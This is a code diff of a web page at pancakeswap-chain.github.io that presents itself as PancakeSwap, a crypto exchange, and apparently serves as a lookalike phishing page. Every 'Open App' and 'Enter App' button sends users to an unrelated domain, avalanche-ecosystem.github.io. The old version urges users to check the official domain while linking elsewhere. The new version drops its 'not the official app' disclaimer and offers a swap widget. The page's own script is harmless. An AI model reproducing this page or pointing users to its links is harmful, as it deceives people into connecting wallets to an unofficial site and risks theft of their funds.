@@ -1,47 +1,113 @@
 <!doctype html>
-<html lang="en"><head>
-<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>PancakeSwap Chain - Open App</title><meta name="description" content="pancakeswap chain guide to open the official PancakeSwap swap app, connect a wallet, choose a network, and swap on supported chains.">
-<meta name="robots" content="index,follow,max-image-preview:large">
-<link rel="canonical" href="https://pancakeswap-chain.github.io/"><meta name="theme-color" content="#FFFFFF">
-<meta property="og:type" content="website"><meta property="og:title" content="PancakeSwap Chain - Open App"><meta property="og:description" content="pancakeswap chain guide to open the official PancakeSwap swap app, connect a wallet, choose a network, and swap on supported chains.">
-<meta property="og:url" content="https://pancakeswap-chain.github.io/"><meta property="og:image" content="https://pancakeswap-chain.github.io/og-cover.png"><meta property="og:locale" content="en">
-<meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="PancakeSwap Chain - Open App"><meta name="twitter:description" content="pancakeswap chain guide to open the official PancakeSwap swap app, connect a wallet, choose a network, and swap on supported chains."><meta name="twitter:image" content="https://pancakeswap-chain.github.io/og-cover.png">
-<link rel="icon" href="favicon.png" type="image/png"><link rel="manifest" href="site.webmanifest"><link rel="apple-touch-icon" href="static/icon-180.png">
-<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600;700&display=swap">
-<link rel="stylesheet" href="static/style.css">
-<script type="application/ld+json">{"@context": "https://schema.org", "@graph": [{"@type": "WebSite", "@id": "https://pancakeswap-chain.github.io/#website", "url": "https://pancakeswap-chain.github.io/", "name": "PancakeSwap"}, {"@type": "WebPage", "@id": "https://pancakeswap-chain.github.io/#webpage", "url": "https://pancakeswap-chain.github.io/", "name": "PancakeSwap Chain - Open App", "description": "pancakeswap chain guide to open the official PancakeSwap swap app, connect a wallet, choose a network, and swap on supported chains.", "inLanguage": "en", "isPartOf": {"@id": "https://pancakeswap-chain.github.io/#website"}}, {"@type": "Organization", "@id": "https://pancakeswap-chain.github.io/#org", "name": "PancakeSwap", "url": "https://pancakeswap-chain.github.io/", "logo": "https://pancakeswap-chain.github.io/og-cover.png", "sameAs": ["https://twitter.com/PancakeSwap", "https://github.com/pancakeswap", "https://defillama.com/protocol/pancakeswap-amm", "https://www.coingecko.com/en/exchanges/pancakeswap-v3-bsc"]}, {"@type": "WebApplication", "@id": "https://pancakeswap-chain.github.io/#app", "name": "PancakeSwap Chain", "url": "https://pancakeswap-chain.github.io/", "applicationCategory": "FinanceApplication", "operatingSystem": "Web", "browserRequirements": "Requires JavaScript", "description": "pancakeswap chain guide to open the official PancakeSwap swap app, connect a wallet, choose a network, and swap on supported chains.", "featureList": ["Non-custodial swaps", "Wallet-routed trading", "Multichain DEX"], "isPartOf": {"@id": "https://pancakeswap-chain.github.io/#website"}}, {"@type": "FAQPage", "@id": "https://pancakeswap-chain.github.io/#faq", "inLanguage": "en", "mainEntity": [{"@type": "Question", "name": "Is PancakeSwap only on BNB Chain?", "acceptedAnswer": {"@type": "Answer", "text": "No. The BNB Chain official site describes BNB Smart Chain as an EVM-compatible main chain, while the current PancakeSwap app supports several chains. BNB Chain remains central to PancakeSwap's identity and CAKE liquidity, and users should confirm the selected chain in the wallet before swapping."}}, {"@type": "Question", "name": "What gas token do I need for PancakeSwap?", "acceptedAnswer": {"@type": "Answer", "text": "The gas token depends on the selected chain. Investopedia's gas-fee explainer describes why transaction fees are paid in the native asset of the network, so BNB Chain needs BNB, Ethereum and Base need ETH on that network, and Solana needs SOL. CAKE is not the universal gas token for PancakeSwap trades."}}, {"@type": "Question", "name": "Can I use PancakeSwap with MetaMask?", "acceptedAnswer": {"@type": "Answer", "text": "Yes for EVM networks. The arXiv paper on EVM compatibility explains why EVM-compatible chains can share tooling patterns, which is the relevant distinction for MetaMask on BNB Chain, Ethereum, Base, Arbitrum, ZKsync, Linea, and opBNB. For non-EVM networks such as Solana or Aptos, users need a compatible wallet for that ecosystem."}}, {"@type": "Question", "name": "Why is my CAKE on the wrong chain?", "acceptedAnswer": {"@type": "Answer", "text": "CAKE can exist on more than one network. BscScan's CAKE token page is one place to verify the BNB Chain token contract, and a balance may not appear if the wallet is connected to a different chain or token contract. Switch to the correct chain and verify the contract address from reputable sources."}}, {"@type": "Question", "name": "Are PancakeSwap swaps custodial?", "acceptedAnswer": {"@type": "Answer", "text": "PancakeSwap swaps are non-custodial when executed from a self-custody wallet. EIP-20 explains approvals and allowances, which is why token permissions still matter even when the user signs transactions from their own wallet."}}, {"@type": "Question", "name": "Where can I check PancakeSwap audits?", "acceptedAnswer": {"@type": "Answer", "text": "PancakeSwap's official audits page lists reports for products such as Infinity, Exchange V3, MasterChef, StableSwap, and other components. Audits reduce unknowns but do not remove all smart-contract, governance, liquidity, or user-signing risk."}}]}]}</script>
-</head><body>
-<header class="site-header">
-  <a class="brand" href="#top" aria-label="PancakeSwap"><img class="brand-mark" src="favicon.png" alt="" width="34" height="34"><span class="brand-name">PancakeSwap</span></a>
-  <nav class="site-nav" aria-label="Primary"><ul class="nav-list"><li><a href="#about">About</a></li><li><a href="#facts">Overview</a></li><li><a href="#faq">FAQ</a></li></ul></nav>
-  <span class="header-spacer"></span>
-  <a class="btn btn-dark header-cta" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a>
-  <button class="nav-toggle" aria-label="Menu" aria-expanded="false"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
-</header>
-<main id="top">
-  <section class="hero">
-    <div class="hero-deco" aria-hidden="true"><span class="strip"></span><span class="d1"></span><span class="d2"></span><span class="d3"></span><span class="d4"></span><span class="d5"></span></div>
-    <div class="container">
-      <h1>PancakeSwap Chain</h1>
-      <div class="bridge-widget" role="group" aria-label="PancakeSwap preview"><div class="bw-field"><span class="bw-coin"><img src="static/bnb.png" alt="BNB" width="36" height="36"></span><span class="bw-meta"><span class="bw-amount">0</span><span class="bw-sub"><b>BNB</b> · BNB Chain</span></span></div><button class="bw-switch" type="button" aria-label="Switch"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 9h13M17 9l-4-4M17 9l-4 4M20 15H7M7 15l4-4M7 15l4 4"/></svg></button><div class="bw-field"><span class="bw-coin mono">CAKE</span><span class="bw-meta"><span class="bw-amount">0.0</span><span class="bw-sub"><b>CAKE</b> · BNB Chain</span></span></div><a class="btn btn-dark bw-go" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a></div>
-      <div class="hero-go"><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open PancakeSwap ↗</a></div>
-      <p class="hero-note">Live preview — open the official PancakeSwap app from your own wallet.</p>
-      <div class="trust-row"><span class="trust-chip">Non-custodial swaps</span><span class="trust-chip">Wallet-routed trading</span><span class="trust-chip">Multichain DEX</span></div>
-    </div>
-  </section>
-  <section class="section" id="about"><div class="container"><h2>What is PancakeSwap Chain?</h2><div class="capsule"><strong>PancakeSwap</strong> is a decentralized exchange and automated market maker for token swaps, liquidity, and related DeFi tools across supported networks. The term usually describes the PancakeSwap chain and network experience rather than a separate blockchain, and Investopedia's <a class="inline-link" href="https://www.investopedia.com/uniswap-uni-definition-5217463" rel="noopener noreferrer">automated market maker overview</a> is useful background for the DEX model before opening the app.</div></div></section>
-  <section class="section" id="facts"><div class="container"><h2>PancakeSwap Chain at a glance</h2><div class="facts"><div class="f"><small>Category</small><b>Decentralized exchange</b></div><div class="f"><small>Network</small><b>BNB Chain and multiple supported chains</b></div><div class="f"><small>Token</small><b>CAKE</b></div><div class="f"><small>Launched</small><b>2020</b></div><div class="f"><small>Custody</small><b>Non-custodial wallet trading</b></div></div><div class="intent-a">For token context, CoinMarketCap maintains a <a class="inline-link" href="https://coinmarketcap.com/currencies/pancakeswap/" rel="noopener noreferrer">CAKE market profile</a>; use it as a reference point, not a promise about price, liquidity, or future returns.</div></div></section>
-  <section class="section section-alt"><div class="container"><h2>What chain is PancakeSwap on?</h2><div class="intent-a">PancakeSwap started on BNB Chain and is still most closely associated with BNB Smart Chain trading, but it is no longer a single-chain DEX. The <a class="inline-link" href="https://docs.pancakeswap.finance/" rel="noopener noreferrer">PancakeSwap product overview</a> describes the current multichain product set, while DefiLlama's <a class="inline-link" href="https://defillama.com/protocol/pancakeswap-amm" rel="noopener noreferrer">PancakeSwap AMM dashboard</a> is a separate data view for the protocol. The exact route a user sees depends on the token pair, wallet network, and whether the app is using same-chain swap, cross-chain swap, or a specific product such as Infinity.</div></div></section><section class="section"><div class="container"><h2>PancakeSwap BNB Chain fees and swap costs</h2><div class="intent-a">A PancakeSwap trade on BNB Chain includes the network gas fee paid in BNB plus the DEX pool or route fee embedded in the swap quote. DefiLlama's <a class="inline-link" href="https://defillama.com/protocol/pancakeswap-amm" rel="noopener noreferrer">fees and volume view</a> helps separate protocol activity from a single user's execution quote, but the effective cost also includes price impact, slippage, and any routing through multiple pools. Before confirming, users should check minimum received, route details, gas token balance, and whether the wallet is on BNB Chain or another supported chain.</div></div></section><section class="section section-alt"><div class="container"><h2>PancakeSwap supported chains for CAKE and swaps</h2><div class="intent-a">PancakeSwap supports swaps beyond BNB Chain, including Ethereum, Solana, Base, Arbitrum, Aptos, ZKsync, Linea, Monad, and opBNB according to its current product documentation. CoinGecko's <a class="inline-link" href="https://www.coingecko.com/en/coins/pancakeswap" rel="noopener noreferrer">CAKE token page</a> lists token ecosystem and explorer references, which is why the token contract address matters before a wallet signs. A CAKE balance on BNB Chain is not automatically the same as a CAKE balance on Ethereum or Aptos, so users should switch the wallet to the intended network and avoid lookalike CAKE tokens promoted in search ads.</div></div></section><section class="section"><div class="container"><h2>PancakeSwap CAKE staking and chain choice</h2><div class="intent-a">CAKE staking and PancakeSwap chain selection are related but not identical. Swapping can happen on several supported chains, while CAKE staking or reward products may be available only in specific app sections and networks. A user who wants to stake CAKE should compare the app's live Earn section with the <a class="inline-link" href="https://coinmarketcap.com/currencies/pancakeswap/" rel="noopener noreferrer">PancakeSwap token listing</a> and confirm the wallet network before approving tokens. Yield rates are not fixed forever; they can depend on emissions, fee sharing, pool rules, and governance changes.</div></div></section>
-  <section class="section"><div class="container"><h2>How to swap PancakeSwap Chain</h2><ol class="steps"><li><b>Open the app</b><span>Use the official pancakeswap.finance domain and go directly to the Swap screen.</span></li><li><b>Connect a wallet</b><span>Choose your wallet, confirm the site, and switch to the network you want to use.</span></li><li><b>Select tokens</b><span>Pick the token you are paying with and the token you want to receive, then review price impact, route, slippage, and gas.</span></li><li><b>Approve and swap</b><span>Approve the token if required; EIP-20's <a class="inline-link" href="https://eips.ethereum.org/EIPS/eip-20" rel="noopener noreferrer">approve and allowance specification</a> explains why token permissions are a separate wallet action.</span></li></ol><div class="intent-a">If funds need to move between networks first, review bridge routes carefully because WIRED's <a class="inline-link" href="https://www.wired.com/story/blockchain-network-bridge-hacks/" rel="noopener noreferrer">blockchain bridge risk reporting</a> shows why cross-chain infrastructure deserves extra scrutiny.</div><div class="cta-band"><div><p>Ready to swap?</p><p class="sub">Open the official PancakeSwap app and verify the domain before you sign.</p></div><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open PancakeSwap ↗</a></div></div></section>
-  <section class="section"><div class="container"><h2>PancakeSwap on BNB Chain vs Ethereum</h2><div class="intent-a">For a BNB Chain-specific market view, CoinGecko tracks <a class="inline-link" href="https://www.coingecko.com/en/exchanges/pancakeswap-v3-bsc" rel="noopener noreferrer">PancakeSwap V3 on BSC</a>, while this table keeps the comparison limited to stable page facts and user workflow differences.</div><div class="cmp-wrap"><table class="cmp-table"><thead><tr><th>Dimension</th><th>BNB Chain</th><th>Ethereum</th></tr></thead><tbody><tr><td>Brand history</td><td>Original and core PancakeSwap chain</td><td>Later supported chain</td></tr><tr><td>Gas token</td><td>BNB</td><td>ETH</td></tr><tr><td>Common use</td><td>CAKE pairs, BNB ecosystem tokens, low-cost swaps</td><td>Ethereum blue chips and cross-chain liquidity</td></tr><tr><td>User risk</td><td>Lookalike BEP-20 tokens and approvals</td><td>Higher gas and duplicate token symbols</td></tr></tbody></table></div></div></section>
-  <section class="section section-alt"><div class="container"><h2>Fees, custody, and security checks</h2><div class="cards three"><article class="card"><h3>Fees</h3><p>Ethereum.org's <a class="inline-link" href="https://ethereum.org/developers/docs/gas/" rel="noopener noreferrer">gas and fees guide</a> explains why transaction costs depend on network execution, so review the wallet quote before signing. On-chain actions are irreversible and this is not financial advice.</p></article><article class="card"><h3>Custody</h3><p>BscScan's <a class="inline-link" href="https://bscscan.com/token/0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82" rel="noopener noreferrer">CAKE token contract page</a> is a practical place to verify the BNB Chain token address before approvals. On-chain actions are irreversible and this is not financial advice.</p></article><article class="card"><h3>Security</h3><p>WIRED's <a class="inline-link" href="https://www.wired.com/story/blockchain-network-bridge-hacks/" rel="noopener noreferrer">bridge exploit coverage</a> is a reminder to verify domains, routes, and wallet prompts before cross-chain actions. On-chain actions are irreversible and this is not financial advice.</p></article></div></div></section>
-  <section class="section section-alt" id="faq"><div class="container"><h2>PancakeSwap Chain FAQ</h2><div class="faq-list"><details open><summary><h3>Is PancakeSwap only on BNB Chain?</h3></summary><div>No. The BNB Chain official site describes <a class="inline-link" href="https://www.bnbchain.org/en" rel="noopener noreferrer">BNB Smart Chain as EVM-compatible</a>, while the current PancakeSwap app supports several chains. BNB Chain remains central to PancakeSwap's identity and CAKE liquidity, and users should always confirm the selected chain in the wallet before swapping.</div></details><details><summary><h3>What gas token do I need for PancakeSwap?</h3></summary><div>The gas token depends on the selected chain. Investopedia's <a class="inline-link" href="https://www.investopedia.com/terms/g/gas-ethereum.asp" rel="noopener noreferrer">gas-fee explainer</a> describes why transaction fees are paid in the native asset of the network: on BNB Chain you need BNB, on Ethereum you need ETH, on Base you need ETH on Base, and on Solana you need SOL. CAKE is not the universal gas token for PancakeSwap trades.</div></details><details><summary><h3>Can I use PancakeSwap with MetaMask?</h3></summary><div>Yes for EVM networks. The arXiv paper on <a class="inline-link" href="https://arxiv.org/abs/2208.10269" rel="noopener noreferrer">EVM compatibility and network effects</a> explains the compatibility layer behind EVM tooling, which is the relevant distinction for MetaMask on BNB Chain, Ethereum, Base, Arbitrum, ZKsync, Linea, and opBNB. For non-EVM networks such as Solana or Aptos, users need a compatible wallet for that ecosystem.</div></details><details><summary><h3>Why is my CAKE on the wrong chain?</h3></summary><div>CAKE can exist on more than one network. BscScan's <a class="inline-link" href="https://bscscan.com/token/0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82" rel="noopener noreferrer">BNB Chain CAKE contract</a> is one place to verify the token address, and a balance may not appear if your wallet is connected to a different chain or token contract. Switch to the correct chain and verify the contract address from reputable sources.</div></details><details><summary><h3>Are PancakeSwap swaps custodial?</h3></summary><div>PancakeSwap swaps are non-custodial when executed from a self-custody wallet. The app and smart contracts route the trade, but the user signs transactions from their own wallet. EIP-20's <a class="inline-link" href="https://eips.ethereum.org/EIPS/eip-20" rel="noopener noreferrer">allowance method reference</a> explains why token approvals still matter.</div></details><details><summary><h3>Where can I check PancakeSwap audits?</h3></summary><div>PancakeSwap maintains an <a class="inline-link" href="https://docs.pancakeswap.finance/welcome-to-pancakeswap/audits" rel="noopener noreferrer">official audits page</a> listing reports for products such as Infinity, Exchange V3, MasterChef, StableSwap, and other components. Audits reduce unknowns but do not remove all smart-contract, governance, liquidity, or user-signing risk.</div></details></div></div></section>
-</main>
-<footer class="site-footer"><div class="container">
-  <p class="footer-note">Not the official app; verify the pancakeswap.finance domain before connecting a wallet. Educational content only, not financial advice.</p>
-  <p class="footer-meta"><a href="#top">Back to top ↑</a></p>
-</div></footer>
-<script src="static/app.js" defer></script>
-</body></html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>PancakeSwap Chain</title>
+  <meta name="description" content="PancakeSwap Chain is the BNB Chain DEX for swapping tokens from your own wallet.">
+  <link rel="canonical" href="https://pancakeswap-chain.github.io/">
+  <meta name="robots" content="index,follow,max-image-preview:large">
+  <meta name="theme-color" content="#F7F6F2">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="PancakeSwap Chain">
+  <meta property="og:description" content="PancakeSwap Chain is the BNB Chain DEX for swapping tokens from your own wallet.">
+  <meta property="og:url" content="https://pancakeswap-chain.github.io/">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="PancakeSwap Chain">
+  <meta name="twitter:description" content="PancakeSwap Chain is the BNB Chain DEX for swapping tokens from your own wallet.">
+  <link rel="icon" type="image/png" href="favicon.png">
+  <link rel="apple-touch-icon" href="favicon.png">
+  <link rel="manifest" href="site.webmanifest">
+  <link rel="stylesheet" href="style.css">
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@graph": [
+      {
+        "@type": "WebSite",
+        "@id": "https://pancakeswap-chain.github.io/#website",
+        "url": "https://pancakeswap-chain.github.io/",
+        "name": "PancakeSwap Chain",
+        "inLanguage": "en"
+      },
+      {
+        "@type": "Organization",
+        "@id": "https://pancakeswap-chain.github.io/#organization",
+        "name": "PancakeSwap",
+        "url": "https://pancakeswap.finance/"
+      },
+      {
+        "@type": "WebApplication",
+        "@id": "https://pancakeswap-chain.github.io/#application",
+        "name": "PancakeSwap Chain",
+        "applicationCategory": "FinanceApplication",
+        "operatingSystem": "Web",
+        "url": "https://pancakeswap-chain.github.io/"
+      }
+    ]
+  }
+  </script>
+</head>
+<body>
+  <header class="topbar">
+    <a class="brand" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">
+      <img src="favicon.png" width="30" height="30" alt="">
+      <span>PancakeSwap Chain</span>
+    </a>
+    <nav class="nav" aria-label="Authority links">
+      <a href="https://bscscan.com/" target="_blank" rel="nofollow noopener noreferrer">BscScan</a>
+      <a href="https://www.coingecko.com/en/coins/pancakeswap" target="_blank" rel="nofollow noopener noreferrer">CoinGecko</a>
+      <a href="https://www.bnbchain.org/en" target="_blank" rel="nofollow noopener noreferrer">BNB Chain</a>
+    </nav>
+    <span class="spacer"></span>
+    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
+  </header>
+
+  <main class="stage">
+    <section class="hero" aria-labelledby="page-title">
+      <h1 id="page-title">PancakeSwap Chain</h1>
+      <p class="sub"><strong>PancakeSwap Chain</strong> is the BNB Chain DEX for swapping tokens from your own wallet.</p>
+    </section>
+
+    <section class="card" aria-label="DEX swap route">
+      <div class="route">
+        <div class="leg">
+          <span class="label">From</span>
+          <span class="chip">
+            <img class="coin" src="bnb.png" width="28" height="28" alt="BNB">
+            <span>BNB</span>
+          </span>
+        </div>
+        <button class="switch" type="button" data-switch aria-label="Switch direction">
+          <span aria-hidden="true">&#8594;</span>
+        </button>
+        <div class="leg">
+          <span class="label">To</span>
+          <span class="chip">
+            <img class="coin" src="cake.png" width="28" height="28" alt="CAKE">
+            <span>CAKE</span>
+          </span>
+        </div>
+      </div>
+      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App <span aria-hidden="true">&#8250;</span></a>
+    </section>
+  </main>
+
+  <footer class="foot">PancakeSwap Chain &mdash; 2026</footer>
+
+  <script>
+  (function () {
+    "use strict";
+    var button = document.querySelector("[data-switch]");
+    if (!button) return;
+    button.addEventListener("click", function () {
+      var chips = document.querySelectorAll(".chip");
+      if (chips.length < 2) return;
+      var first = chips[0].innerHTML;
+      chips[0].innerHTML = chips[1].innerHTML;
+      chips[1].innerHTML = first;
+    });
+  })();
+  </script>
+</body>
+</html>
